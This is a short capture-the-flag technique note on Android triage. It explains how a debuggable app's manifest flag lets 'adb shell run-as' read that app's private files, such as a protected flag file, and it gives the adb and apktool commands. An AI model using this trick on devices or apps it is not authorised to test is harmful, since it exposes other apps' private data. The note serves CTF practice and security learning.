# Misc - Android device and APK triage

## android:debuggable="true" → adb run-as for app-UID file reads

**Trigger:** An Android challenge hands you APKs plus a live device/emulator over adb, the flag file exists but is mode 0600 owned by an app UID (`u0_a###`) that the shell user cannot read, and the intended path is a multi-step IPC chain (intent redirection, exported provider, HMAC tag forgery).

Before building an exploit APK, read the manifests for `android:debuggable="true"`. Any debuggable package is reachable through `adb shell run-as <package>`, which re-executes the command as that package's UID inside its SELinux domain — that alone reads anything the app itself can read, collapsing an entire IPC chain into one command. Triage order: `adb shell ls -la <flagpath>` for mode and owner UID, `adb shell dumpsys package <pkg> | grep userId` (or `pm list packages -U`) to map the owning `u0_a###` back to a package, then `adb shell run-as <that package> cat <flagpath>`. Launch each app's main activity once first — provisioning/registration often creates the file or the UID mapping. When the instancer wraps ADB in TLS, run the handout's proxy to expose it as plain TCP and `adb connect 127.0.0.1:5555`. Treat this as the first thing you check on any Android handout: shipped demo builds frequently carry the debug build type by accident, and the check costs one grep of the decoded manifest.

```bash
adb connect 127.0.0.1:5555
adb shell am start -n com.example.app/.MainActivity      # provision first
adb shell ls -la /system/flag.txt                        # -rw------- u0_a150
adb shell pm list packages -U | grep 10150               # UID -> package
adb shell run-as com.example.verifier cat /system/flag.txt
# manifest check on the handout:
apktool d app.apk -o out && grep -o 'android:debuggable="[a-z]*"' out/AndroidManifest.xml
```

Source: https://cybersecurityelite.com/ctf-writeups/sekai-ctf-2026-writeup/
